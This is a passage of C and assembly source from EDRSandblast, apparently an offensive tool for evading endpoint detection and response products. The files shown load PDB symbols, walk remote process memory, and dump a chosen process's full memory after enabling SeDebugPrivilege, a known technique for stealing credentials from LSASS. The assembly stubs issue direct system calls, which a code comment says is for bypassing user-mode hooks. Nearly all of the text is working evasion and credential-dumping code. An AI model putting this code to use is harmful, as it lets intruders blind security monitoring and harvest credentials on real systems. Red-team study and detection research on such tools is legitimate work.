		free(ctx);
		return NULL;
	}
	ctx->sym_handle = cp;

	DWORD64 pdb_base_addr = SymLoadModuleExW(cp, NULL, ctx->pdb_name_w, NULL, asked_pdb_base_addr, pdb_image_size, NULL, 0);
	while (pdb_base_addr == 0) {
		DWORD err = GetLastError();
		if (err == ERROR_SUCCESS)
			break;
		if (err == ERROR_FILE_NOT_FOUND) {
			printf_or_not("PDB file not found\n");
			SymUnloadModule(cp, asked_pdb_base_addr);//TODO : fix handle leak
			SymCleanup(cp);
			free(ctx);
			return NULL;
		}
		printf_or_not("SymLoadModuleExW, error 0x%x\n", GetLastError());
		asked_pdb_base_addr += 0x1000000;
		pdb_base_addr = SymLoadModuleExW(cp, NULL, ctx->pdb_name_w, NULL, asked_pdb_base_addr, pdb_image_size, NULL, 0);
	}
	ctx->pdb_base_addr = pdb_base_addr;
	return ctx;
}

symbol_ctx* LoadSymbolsFromImageFile(LPCWSTR image_file_path) {
	PVOID image_content = ReadFullFileW(image_file_path);
	PE* pe = PE_create(image_content, FALSE);
	symbol_ctx* ctx = LoadSymbolsFromPE(pe);
	PE_destroy(pe);
	free(image_content);
	return ctx;
}

DWORD64 GetSymbolOffset(symbol_ctx* ctx, LPCSTR symbol_name) {
	SYMBOL_INFO_PACKAGE si = { 0 };
	si.si.SizeOfStruct = sizeof(SYMBOL_INFO);
	si.si.MaxNameLen = sizeof(si.name);
	BOOL res = SymGetTypeFromName(ctx->sym_handle, ctx->pdb_base_addr, symbol_name, &si.si);
	if (res) {
		return si.si.Address - ctx->pdb_base_addr;
	}
	else {
		return 0;
	}
}

DWORD GetFieldOffset(symbol_ctx* ctx, LPCSTR struct_name, LPCWSTR field_name) {
	SYMBOL_INFO_PACKAGE si = {0};
	si.si.SizeOfStruct = sizeof(SYMBOL_INFO);
	si.si.MaxNameLen = sizeof(si.name);
	BOOL res = SymGetTypeFromName(ctx->sym_handle, ctx->pdb_base_addr, struct_name, &si.si);
	if (!res) {
		return 0;
	}

	TI_FINDCHILDREN_PARAMS* childrenParam = calloc(1, sizeof(TI_FINDCHILDREN_PARAMS));
	if (childrenParam == NULL) {
		return 0;
	}

	res = SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, si.si.TypeIndex, TI_GET_CHILDRENCOUNT, &childrenParam->Count);
	if (!res){
		return 0;
	}
	TI_FINDCHILDREN_PARAMS* ptr = realloc(childrenParam, sizeof(TI_FINDCHILDREN_PARAMS) + childrenParam->Count * sizeof(ULONG));
	if (ptr == NULL) {
		free(childrenParam);
		return 0;
	}
	childrenParam = ptr;
	res = SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, si.si.TypeIndex, TI_FINDCHILDREN, childrenParam);
	DWORD offset = 0;
	for (ULONG i = 0; i < childrenParam->Count; i++) {
		ULONG childID = childrenParam->ChildId[i];
		WCHAR* name = NULL;
		SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, childID, TI_GET_SYMNAME, &name);
		if (wcscmp(field_name, name)) {
			continue;
		}
		SymGetTypeInfo(ctx->sym_handle, ctx->pdb_base_addr, childID, TI_GET_OFFSET, &offset);
		break;
	}
	free(childrenParam);
	return offset;
}

void UnloadSymbols(symbol_ctx* ctx, BOOL delete_pdb) {
	SymUnloadModule(ctx->sym_handle, ctx->pdb_base_addr);
	SymCleanup(ctx->sym_handle);
	if (delete_pdb) {
		DeleteFileW(ctx->pdb_name_w);
	}
	free(ctx->pdb_name_w);
	ctx->pdb_name_w = NULL;
	free(ctx);
}

```

`EDRSandblast/Utils/ProcessDump.c`:

```c
/*

--- Process dump functions.

*/
#include <Windows.h>
#include <TlHelp32.h>
#include <minidumpapiset.h>
#include <tchar.h>

#include "../EDRSandblast.h"
#include "PEParser.h"
#include "ProcessDump.h"

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    LUID luid;
    BOOL bRet = FALSE;

    if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        TOKEN_PRIVILEGES tp = { 0 };

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

        if (AdjustTokenPrivileges(hToken, FALSE, &tp, 0, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
            bRet = (GetLastError() == ERROR_SUCCESS);
        }
    }
    return bRet;
}

DWORD WINAPI dumpProcess(LPTSTR processName, TCHAR* outputDumpFile) {
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32 = { 0 };

    //Enable the SeDebugPrivilege
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
        CloseHandle(hToken);
    }

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        _tprintf_or_not(TEXT("[!] %s dump failed: impossible to get snapshot of the system's processes (CreateToolhelp32Snapshot)\n"), processName);
        return 1;
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process,
    // and exit if unsuccessful
    if (!Process32First(hProcessSnap, &pe32)) {
        _tprintf_or_not(TEXT("[!] %s dump failed: obtained invalid process handle\n"), processName); // show cause of failure
        CloseHandle(hProcessSnap);          // clean the snapshot object
        return 1;
    }

    //HANDLE hDbghelp = LoadLibrary(TEXT("dbgcore.dll"));
    //PE* dbghelpPe = PE_create(hDbghelp, TRUE);
    //_MiniDumpWriteDump MiniDumpWriteDumpFunc = (_MiniDumpWriteDump) PE_functionAddr(dbghelpPe, "MiniDumpWriteDump");

    _MiniDumpWriteDump MiniDumpWriteDumpFunc = (_MiniDumpWriteDump) GetProcAddress(LoadLibrary(TEXT("dbghelp.dll")), "MiniDumpWriteDump");

    // Now walk the snapshot of processes, and look for the specified process.
    do {
        if (_tcscmp(pe32.szExeFile, processName)) {
            continue;
        }

        hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
        if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
            _tprintf_or_not(TEXT("[!] %s dump failed: couldn't open process memory (OpenProcesswith error 0x%x)\n"), processName, GetLastError());
            return 1;
        }

        HANDLE hDumpFile = CreateFile(outputDumpFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hDumpFile == INVALID_HANDLE_VALUE) {
            _tprintf_or_not(TEXT("[!] %s dump failed: couldn't create dump file (CreateFile)\n"), processName);
            return 1;
        }
        BOOL dumped = MiniDumpWriteDumpFunc(hProcess, pe32.th32ProcessID, hDumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        if (!dumped) {
            _tprintf_or_not(TEXT("[!] %s dump failed: couldn't dump process (MiniDumpWriteDump with error 0x%x)\n"), processName, GetLastError());
            return 1;
        }
        _tprintf_or_not(TEXT("[+] %s sucessfully dumped to: %s\n"), processName, outputDumpFile);
        CloseHandle(hProcess);

    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return 0;
}

DWORD WINAPI dumpProcessFromThread(PVOID* args) {
    return dumpProcess(args[0], args[1]);
}
```

`EDRSandblast/Utils/RemotePEBBrowser.c`:

```c
#include "RemotePEBBrowser.h"
#include "SW2_Syscalls.h"

PVOID GetRVA(ULONG_PTR baseAddress, ULONG_PTR RVA) {
    return (PVOID)(baseAddress + RVA);
}

// Return a pointer to the target process (PEB) Ldr's InMemoryOrderModuleList.
PLDR_DATA_TABLE_ENTRY getPebLdrAddress(HANDLE hProcess) {
    // Get target process PEB address.
    PROCESS_BASIC_INFORMATION basicInfo = { 0 };
    basicInfo.PebBaseAddress = 0;
    PROCESSINFOCLASS ProcessInformationClass = 0;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessInformationClass, &basicInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL);
    if (!NT_SUCCESS(status)) {
        _tprintf_or_not(TEXT("[-] Module parsing failed: couldn't get target process PEB address\n"));
        return NULL;
    }
    
#if _WIN64
    PVOID pPebLdrAddress = (PVOID)((ULONG_PTR) basicInfo.PebBaseAddress + offsetof(PEB64, Ldr));
#else
    PVOID pPebLdrAddress = (PVOID)((ULONG_PTR) basicInfo.PebBaseAddress + offsetof(PEB, Ldr));
#endif

    PPEB_LDR_DATA pprocessLdr = NULL;
    status = NtReadVirtualMemory(hProcess, pPebLdrAddress, &pprocessLdr, sizeof(PPEB_LDR_DATA), NULL);
    if (!NT_SUCCESS(status)) {
        _tprintf_or_not(TEXT("[-] Module parsing failed: couldn't get target process Ldr address (NtReadVirtualMemory error 0x%x).\n"), status);
        return NULL;
    }

    // As PLDR_DATA_TABLE_ENTRY starts with InLoadOrderLinks while PEB_LDR_DATA's InLoadOrderModuleList is at offset 0x0C.
    return (PLDR_DATA_TABLE_ENTRY)(((PBYTE)pprocessLdr) + offsetof(PEB_LDR_DATA, InLoadOrderModuleList));
}

PMODULE_INFO createModuleInfo(HANDLE hProcess, PLDR_DATA_TABLE_ENTRY ldrEntry) {
    PMODULE_INFO newModuleInfo = calloc(1, sizeof(MODULE_INFO));

    if (!newModuleInfo) {
        _tprintf_or_not(TEXT("[-] Module parsing failed: couldn't allocate new module info\n"));
        return NULL;
    }

    newModuleInfo->next = NULL;
    newModuleInfo->dllBase = (ULONG64)(ULONG_PTR) ldrEntry->DllBase;
    newModuleInfo->ImageSize = ldrEntry->SizeOfImage;
    newModuleInfo->timeDateStamp = ldrEntry->TimeDateStampOrLoadedImports.TimeDateStamp;
    newModuleInfo->checkSum = ldrEntry->HashLinksOrSectionPointerAndCheckSum.SectionPointerAndCheckSum.CheckSum;

    // read the full path of the DLL
    NTSTATUS status = NtReadVirtualMemory(hProcess, (PVOID) ldrEntry->FullDllName.Buffer, newModuleInfo->dllName, ldrEntry->FullDllName.Length, NULL);
    if (!NT_SUCCESS(status)) {
        _tprintf_or_not(TEXT("[-] Module parsing failed: couldn't retrieve dllName from Ldr entry (NtReadVirtualMemory error 0x%x).\n"), status);
        return NULL; 
    }

    return newModuleInfo;
}

PMODULE_INFO getModulesInLdrByInMemoryOrder(HANDLE hProcess) {
    PMODULE_INFO pmoduleList = NULL;
    NTSTATUS status = FALSE;

    // Retrieve the remote process Ldr address as pseudo PLDR_DATA_TABLE_ENTRY.
    PLDR_DATA_TABLE_ENTRY pLdrAddressInPeb = getPebLdrAddress(hProcess);
    if (!pLdrAddressInPeb) {
        return NULL;
    }

    // Iterate over the linked list by InMemoryOrderModuleList order.
    LDR_DATA_TABLE_ENTRY LdrCurrentEntry;
    PLDR_DATA_TABLE_ENTRY pLdrCurrentEntryAddress = pLdrAddressInPeb;

    while (TRUE) {
        // Add InMemoryOrderLinks offset to iterate on InMemoryOrderLinks order (by retrieving the ptr at InMemoryOrderLinks).
        status = NtReadVirtualMemory(hProcess, ((PBYTE) pLdrCurrentEntryAddress) + offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &pLdrCurrentEntryAddress, sizeof(PLDR_DATA_TABLE_ENTRY), NULL);
        if (!NT_SUCCESS(status)) {
            _tprintf_or_not(TEXT("[-] Module parsing failed: couldn't get Ldr InLoadOrderModuleList first element address (NtReadVirtualMemory error 0x%x).\n"), status);
            return NULL;
        }
    
        // Substract InMemoryOrderLinks offset to be at the top of the LDR_DATA_TABLE_ENTRY struct.
        pLdrCurrentEntryAddress = (PLDR_DATA_TABLE_ENTRY)(((PBYTE)pLdrCurrentEntryAddress) - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));

        // Looped back to the first entry.
        if (pLdrAddressInPeb == pLdrCurrentEntryAddress) {
            break;
        }
        
        // Read LDR_DATA_TABLE_ENTRY data for the current element.
        status = NtReadVirtualMemory(hProcess, pLdrCurrentEntryAddress, &LdrCurrentEntry, sizeof(LDR_DATA_TABLE_ENTRY), NULL);
        if (!NT_SUCCESS(status)) {
            _tprintf_or_not(TEXT("[-] Module parsing failed: couldn't get Ldr InLoadOrderModuleList next element (NtReadVirtualMemory error 0x%x).\n"), status);
            return NULL;
        }

        // Create module info for list using the current LDR_DATA_TABLE_ENTRY entry.
        PMODULE_INFO pnewModuleInfo = createModuleInfo(hProcess, &LdrCurrentEntry);
        if (!pnewModuleInfo) {
            return NULL;
        }

        // Insert the new module info element to the module list.
        if (!pmoduleList) {
            pmoduleList = pnewModuleInfo;
        }
        else {
            PMODULE_INFO plastModule = pmoduleList;
            while (plastModule->next) {
                plastModule = plastModule->next;
            }
            plastModule->next = pnewModuleInfo;
        }
    }

    return pmoduleList;
}

PMEMORY_PAGE_INFO getMemoryPagesInfo(HANDLE hProcess, BOOL filterPage) {
    PMEMORY_PAGE_INFO prangesList = NULL;
    PMEMORY_PAGE_INFO newRange = NULL;
    PVOID baseAddress = NULL;
    PVOID currentAddress = NULL;
    ULONG64 regionSize = 0;
    MEMORY_INFORMATION_CLASS memoryInfoClass = { 0 };
    MEMORY_BASIC_INFORMATION memoryBasicInfo = { 0 };
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    while (TRUE) {
        status = NtQueryVirtualMemory(hProcess, (PVOID)currentAddress, memoryInfoClass, &memoryBasicInfo, sizeof(memoryBasicInfo), NULL);
        
        // The specified base address is outside the range of accessible addresses, iteration is finished.
        if (status == STATUS_INVALID_PARAMETER) {
            break;
        }
        else if (!NT_SUCCESS(status)) {
            _tprintf_or_not(TEXT("[-] Memory pages info retrieval failed: couldn't query memory page (NtQueryVirtualMemory error 0x%x).\n"), status);
            return NULL;
        }

        baseAddress = memoryBasicInfo.BaseAddress;
        regionSize = memoryBasicInfo.RegionSize;

        // Overflow.
        if (((ULONG_PTR) baseAddress + regionSize) < (ULONG_PTR) baseAddress) {
            break;
        }

        // Next memory range.
        currentAddress = (PVOID) GetRVA((ULONG_PTR) baseAddress, (ULONG_PTR) regionSize);

        if (filterPage) {
            // Ignore non-commited pages.
            if (memoryBasicInfo.State != MEM_COMMIT) {
                continue;
            }

            // Ignore mapped pages.
            if (memoryBasicInfo.Type == MEM_MAPPED) {
                continue;
            }

            // Ignore pages with PAGE_NOACCESS. {
            if ((memoryBasicInfo.Protect & PAGE_NOACCESS) == PAGE_NOACCESS) {
                continue;
            }

            // Ignore pages with PAGE_GUARD.
            if ((memoryBasicInfo.Protect & PAGE_GUARD) == PAGE_GUARD) {
                continue;
            }

            // Ignore pages with PAGE_EXECUTE. {
            if ((memoryBasicInfo.Protect & PAGE_EXECUTE) == PAGE_EXECUTE) {
                continue;
            }
        }

        newRange = calloc(1, sizeof(MEMORY_PAGE_INFO));
        if (!newRange) {
            _tprintf_or_not(TEXT("[-] Memory pages info retrieval failed: couldn't allocate memory for new MEMORY_RANGE_INFO"));
            return NULL;
        }

        newRange->next = NULL;
        newRange->startOfMemoryPage = (ULONG_PTR)baseAddress;
        newRange->dataSize = regionSize;
        newRange->state = memoryBasicInfo.State;
        newRange->protect = memoryBasicInfo.Protect;
        newRange->type = memoryBasicInfo.Type;

        if (!prangesList) {
            prangesList = newRange;
        }
        else {
            PMEMORY_PAGE_INFO lastRange = prangesList;
            while (lastRange->next) {
                lastRange = lastRange->next;
            }
            lastRange->next = newRange;
        }
    }

    if (!prangesList) {
        _tprintf_or_not(TEXT("[-] Memory pages info retrieval failed: couldn't retrieve any page"));
        return NULL;
    }

    return prangesList;
}

```

`EDRSandblast/Utils/SW2_Syscalls.c`:

```c
#include "PEBBrowse.h"
#include "PEParser.h"
#include "SW2_Syscalls.h"

// Code below is adapted from @modexpblog. Read linked article for more details.
// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

SW2_SYSCALL_LIST SW2_SyscallList;

DWORD SW2_HashSyscall(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SW2_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
        Hash ^= PartialName + SW2_ROR8(Hash);
    }

    return Hash;
}

int CmpSyscallEntriesByRVA(SW2_SYSCALL_ENTRY const* a, SW2_SYSCALL_ENTRY const* b) {
    if (a->RVA < b->RVA) {
        return -1;
    }
    else if (a->RVA > b->RVA) {
        return +1;
    }
    else {
        return 0;
    }
}

int CmpSyscallEntriesByHash(SW2_SYSCALL_ENTRY const* a, SW2_SYSCALL_ENTRY const* b) {
    if (a->Hash < b->Hash) {
        return -1;
    }
    else if (a->Hash > b->Hash) {
        return +1;
    }
    else {
        return 0;
    }
}

BOOL SW2_PopulateSyscallList(void)
{
    // Return early if the list is already populated.
    if (SW2_SyscallList.Count) return TRUE;

    PE* ntdll = PE_create(getModuleEntryFromNameW(L"ntdll.dll")->DllBase, TRUE);
    // Populate SW2_SyscallList with unsorted Zw* entries.
    DWORD i = 0;
    PSW2_SYSCALL_ENTRY Entries = SW2_SyscallList.Entries;
    for (DWORD nameOrdinal = 0; nameOrdinal < ntdll->exportedNamesLength; nameOrdinal++) {
        LPCSTR functionName = PE_RVA_to_Addr(ntdll, ntdll->exportedNames[nameOrdinal]);
        if (*(WORD*)functionName == *((WORD*)"Zw")) {
            Entries[i].Hash = SW2_HashSyscall(functionName);
            Entries[i].RVA = PE_functionRVA(ntdll, functionName);
            i++;
        }
    }

    // Save total number of system calls found.
    SW2_SyscallList.Count = i;

    // Sort the list by address in ascending order.
    qsort(Entries, SW2_SyscallList.Count, sizeof(SW2_SYSCALL_ENTRY), CmpSyscallEntriesByRVA);

    // Deduce the syscall numbers.
    for (DWORD j = 0; j < SW2_SyscallList.Count; j++) {
        SW2_SyscallList.Entries[j].SyscallNumber = j;
    }

    // Sort the list by hash for quicker search.
    qsort(Entries, SW2_SyscallList.Count, sizeof(SW2_SYSCALL_ENTRY), CmpSyscallEntriesByHash);

    return TRUE;
}

EXTERN_C DWORD SW2_GetSyscallNumber(DWORD FunctionHash)
{
    // Ensure SW2_SyscallList is populated.
    if (!SW2_PopulateSyscallList()) return 0xFFFFFFFF;

    DWORD down = 0;
    DWORD up = SW2_SyscallList.Count;
    while (up - down > 1) {
        DWORD mid = (down + up) / 2;
        if (SW2_SyscallList.Entries[mid].Hash <= FunctionHash) {
            down = mid;
        }
        else {
            up = mid;
        }
    }
    if (SW2_SyscallList.Entries[down].Hash == FunctionHash) {
        return SW2_SyscallList.Entries[down].SyscallNumber;
    }
    else {
        return 0xFFFFFFFF;
    }

}

```

`EDRSandblast/Utils/SW2_Syscalls_stubs.x64.asm`:

```asm
.data
currentHash DWORD 0

.code
EXTERN SW2_GetSyscallNumber: PROC

WhisperMain PROC
    pop rax
    mov [rsp+ 8], rcx              ; Save registers.
    mov [rsp+16], rdx
    mov [rsp+24], r8
    mov [rsp+32], r9
    sub rsp, 28h
    mov ecx, currentHash
    call SW2_GetSyscallNumber
    add rsp, 28h
    mov rcx, [rsp+ 8]              ; Restore registers.
    mov rdx, [rsp+16]
    mov r8, [rsp+24]
    mov r9, [rsp+32]
    mov r10, rcx
    syscall                        ; Issue syscall
    ret
WhisperMain ENDP

NtGetNextProcess PROC
    mov currentHash, 0CD50C4CCh    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtGetNextProcess ENDP

NtQueryInformationProcess PROC
    mov currentHash, 055A17810h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtQueryInformationProcess ENDP

NtClose PROC
    mov currentHash, 054DEA057h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtClose ENDP

NtAllocateVirtualMemory PROC
    mov currentHash, 08708BDBBh    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtAllocateVirtualMemory ENDP

NtOpenProcess PROC
    mov currentHash, 0FDBCE430h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtOpenProcess ENDP

NtQueryVirtualMemory PROC
    mov currentHash, 083906983h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtQueryVirtualMemory ENDP

NtReadVirtualMemory PROC
    mov currentHash, 0309A0DDEh    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtReadVirtualMemory ENDP

NtCreateFile PROC
    mov currentHash, 086A15898h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtCreateFile ENDP

NtWriteFile PROC
    mov currentHash, 0B224DCF0h    ; Load function hash into global variable.
    call WhisperMain               ; Resolve function hash into syscall number and make the call
NtWriteFile ENDP

end
```

`EDRSandblast/Utils/SignatureOps.c`:

```c
#include "SignatureOps.h"
#include "../EDRSandblast.h"

// Concat in pSigners output the list of Signer(s) signing the specified file on disk.
SignatureOpsError GetFileSigners(TCHAR* pFilePath, TCHAR* outSigners, size_t* szOutSigners) {
    HCERTSTORE hCertStore = NULL;
    HCRYPTMSG hCryptMsg = NULL;
    DWORD dwCountSigners = 0;
    DWORD dwcbSz = sizeof(DWORD), dwcbSzPrevious = sizeof(DWORD);
    PCMSG_SIGNER_INFO pSignerInfo = NULL;
    CERT_INFO certificateInfo = { 0 };
    PCCERT_CONTEXT pCertContext = NULL;
    TCHAR* tmpSignerName = NULL;
    TCHAR* pSigners = NULL;
    TCHAR* tmpSignerHolder = NULL;
    size_t sztmpSignerHolder = 0;
    TCHAR signerSeperator[] = TEXT(" | ");
    DWORD dwError = 0;
    BOOL returnStatus = 0;
    
    returnStatus = CryptQueryObject(CERT_QUERY_OBJECT_FILE,
                                     pFilePath,
                                     CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
                                     CERT_QUERY_FORMAT_FLAG_BINARY,
                                     0,
                                     NULL,
                                     NULL,
                                     NULL,
                                     &hCertStore,
                                     &hCryptMsg,
                                     NULL);

    if (!returnStatus) {
        dwError = GetLastError();
        // File is not signed.
        if (dwError == CRYPT_E_NO_MATCH) {
            return E_NOT_SIGNED;
        }
        else {
            _tprintf_or_not(TEXT("[!] Couldn't retrieve certificate objects of file \"%s\" (CryptQueryObject(CERT_QUERY_OBJECT_FILE) failed: 0x%08lx)\n"), pFilePath, GetLastError());
            return E_KO;
        }
    }
    
    // Check that the file has at least one Signer.
    returnStatus = CryptMsgGetParam(hCryptMsg, CMSG_SIGNER_COUNT_PARAM, 0, &dwCountSigners, &dwcbSz);
    if (!returnStatus) {
        _tprintf_or_not(TEXT("[!] Couldn't get number of signers of file \"%s\" (CryptMsgGetParam(CMSG_SIGNER_COUNT_PARAM) failed: 0x%08lx)\n"), pFilePath, GetLastError());
        goto cleanup;
    }
     
    if (dwCountSigners == 0) {
        _tprintf_or_not(TEXT("[-] \"%s\" file is not digitally signed by at least one signer\n"), pFilePath);
        CryptMsgClose(hCryptMsg);
        hCryptMsg = NULL;
        CertCloseStore(hCertStore, 0);
        hCertStore = NULL;
        return E_NOT_SIGNED;
    }

    // Get Signer name of each certificates and concat to Signers string.
    for (DWORD index = 0; index < dwCountSigners; index++) {
        // index = 0;
        dwcbSz = 0;
        if (pSignerInfo) {
            free(pSignerInfo);
            pSignerInfo = NULL;
        }
        if (tmpSignerName) {
            free(tmpSignerName);
            tmpSignerName = NULL;
        }
        if (pCertContext) {
            CertFreeCertificateContext(pCertContext);
            pCertContext = NULL;
        }

        // Retrieve the CMSG_SIGNER_INFO_PARAM that contains the information to build CERT_INFO (Issuer and SerialNumber).
        // First call CryptMsgGetParam to retrieve the size neeeded for the buffer.
        returnStatus = CryptMsgGetParam(hCryptMsg, CMSG_SIGNER_INFO_PARAM, index, NULL, &dwcbSz);
        if (!returnStatus || !dwcbSz) {
            _tprintf_or_not(TEXT("[!] Couldn't get signer information of certificate of file \"%s\" (CryptMsgGetParam(CMSG_SIGNER_INFO_PARAM) for size failed: 0x%08lx)\n"), pFilePath, GetLastError());
            goto cleanup;
        }

        // Allocate the size needed by CryptMsgGetParam to retrieve CMSG_SIGNER_INFO_PARAM.
        pSignerInfo = (PCMSG_SIGNER_INFO)calloc(dwcbSz, sizeof(BYTE));
        if (!pSignerInfo) {
            _putts_or_not(TEXT("[!] Couldn't allocate memory for PCMSG_SIGNER_INFO"));
            goto cleanup;
        }

        // Retrieve the CMSG_SIGNER_INFO_PARAM of the certificate and validate the return.
        dwcbSzPrevious = dwcbSz;
        returnStatus = CryptMsgGetParam(hCryptMsg, CMSG_SIGNER_INFO_PARAM, index, pSignerInfo, &dwcbSz);
        if (!returnStatus || (dwcbSzPrevious != dwcbSz)) {
            _tprintf_or_not(TEXT("[!] Couldn't get signer information of certificate of file \"%s\" (CryptMsgGetParam(CMSG_SIGNER_INFO_PARAM) failed: 0x%08lx)\n"), pFilePath, GetLastError());
            goto cleanup;
        }

        // Build CERT_INFO for certificate lookup using CertFindCertificateInStore. 
        memset(&certificateInfo, 0, sizeof(CERT_INFO));
        certificateInfo.Issuer = pSignerInfo->Issuer;
        certificateInfo.SerialNumber = pSignerInfo->SerialNumber;
        
        // Certificate lookup matching the Issuer and SerialNumber in hCertStore.
        pCertContext = CertFindCertificateInStore(hCertStore, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_SUBJECT_CERT, &certificateInfo, NULL);
        if (!pCertContext) {
            _tprintf_or_not(TEXT("[!] Couldn't find certificate of file \"%s\" in store (CertFindCertificateInStore failed: 0x%08lx)\n"), pFilePath, GetLastError());
            goto cleanup;
        }

        // Retrieves the subject name. First call is done to determine the subject name size.
        dwcbSz = CertNameToStr(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, &pCertContext->pCertInfo->Subject, CERT_SIMPLE_NAME_STR, NULL, 0);
        tmpSignerName = calloc(dwcbSz, sizeof(TCHAR));
        if (!tmpSignerName) {
            _putts_or_not(TEXT("[!] Couldn't allocate memory for decoded certificate Subject name."));
            goto cleanup;
        }

        CertNameToStr(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, &pCertContext->pCertInfo->Subject, CERT_SIMPLE_NAME_STR, tmpSignerName, dwcbSz);
        if (!tmpSignerName) {
            _tprintf_or_not(TEXT("[!] Couldn't retrieve decoded Subject name of certificate of file \"%s\" (CertNameToStr failed: 0x%08lx)\n"), pFilePath, GetLastError());
            goto cleanup;
        }

        // Concat the subject to the already found ones, if any.
        if (pSigners) {
            sztmpSignerHolder = _tcsclen(pSigners) + _tcsclen(signerSeperator) + _tcsclen(tmpSignerName) + 1;
            tmpSignerHolder = (TCHAR*)calloc(sztmpSignerHolder, sizeof(TCHAR));
            if (!tmpSignerHolder) {
                _putts_or_not(TEXT("[!] Couldn't allocate memory for concatenated signers"));
                goto cleanup;
            }
            _tcscat_s(tmpSignerHolder, sztmpSignerHolder, pSigners);
            _tcscat_s(tmpSignerHolder, sztmpSignerHolder, signerSeperator);
            _tcscat_s(tmpSignerHolder, sztmpSignerHolder, tmpSignerName);
            free(pSigners);
            pSigners = tmpSignerHolder;
            break;
        }
        else {
            sztmpSignerHolder = _tcsclen(tmpSignerName) + 1;
            pSigners = (TCHAR*)calloc(sztmpSignerHolder, sizeof(TCHAR));
            if (!pSigners) {
                _putts_or_not(TEXT("[!] Couldn't allocate memory for first signer"));
                goto cleanup;
            }
            _tcscpy_s(pSigners, sztmpSignerHolder, tmpSignerName);
        }
    }

    CertFreeCertificateContext(pCertContext);
    pCertContext = NULL;
    CryptMsgClose(hCryptMsg);
    hCryptMsg = NULL;
    CertCloseStore(hCertStore, 0);
    hCertStore = NULL;
    free(pSignerInfo);
    pSignerInfo = NULL;
    free(tmpSignerName);
    tmpSignerName = NULL;

    if (!outSigners  || (*szOutSigners < sztmpSignerHolder)) {
        *szOutSigners = sztmpSignerHolder;
        free(pSigners);
        return E_INSUFFICIENT_BUFFER;
    }
    else {
        *szOutSigners = sztmpSignerHolder;
        _tcscat_s(outSigners, sztmpSignerHolder, pSigners);
        free(pSigners);
        return E_SUCCESS;
    }

cleanup:

    if (pCertContext) {
        CertFreeCertificateContext(pCertContext);
        pCertContext = NULL;
    }

    if (hCryptMsg) {
        CryptMsgClose(hCryptMsg);
        hCryptMsg = NULL;
    }

    if (hCertStore) {
        CertCloseStore(hCertStore, 0);
        hCertStore = NULL;
    }

    if (pSignerInfo) {
        free(pSignerInfo);
        pSignerInfo = NULL;
    }

    if (tmpSignerName) {
        free(tmpSignerName);
        tmpSignerName = NULL;
    }

    return E_KO;
}
```

`EDRSandblast/Utils/StringUtils.c`:

```c
/*

--- Utility function to generate a random string.

*/

#include "StringUtils.h"

//BOOL isFullPath(IN TCHAR* filename) {
//    char c;
//
//    if (filename[0] == filename[1] && filename[1] == TEXT('\\')) {
//        return TRUE;
//    }
//
//    c = filename[0] | 0x20;
//    if (c < 97 || c > 122) {
//        return FALSE;
//    }
//
//    c = filename[1];
//    if (c != ':') {
//        return FALSE;
//    }
//
//    c = filename[2];
//    if (c != '\\') {
//        return FALSE;
//    }
//
//    return TRUE;
//}

VOID getUnicodeStringFromTCHAR(OUT PUNICODE_STRING unicodeString, IN WCHAR* wcharString) {
    unicodeString->Buffer = wcharString;
    unicodeString->Length = (WORD)_tcslen(unicodeString->Buffer) * sizeof(WCHAR);
    unicodeString->MaximumLength = unicodeString->Length + sizeof(WCHAR);
}

BOOL srandDone = FALSE;

/*
* Generates a "length"-long random alphanumeric string
* Assumes the allocation is big enough to receive "length" chararcters (so is at least "length + 1" long)
*/
TCHAR* generateRandomString(TCHAR* str, size_t length) {
    if (!srandDone) {
        srand((unsigned int)time(0));
        srandDone = TRUE;
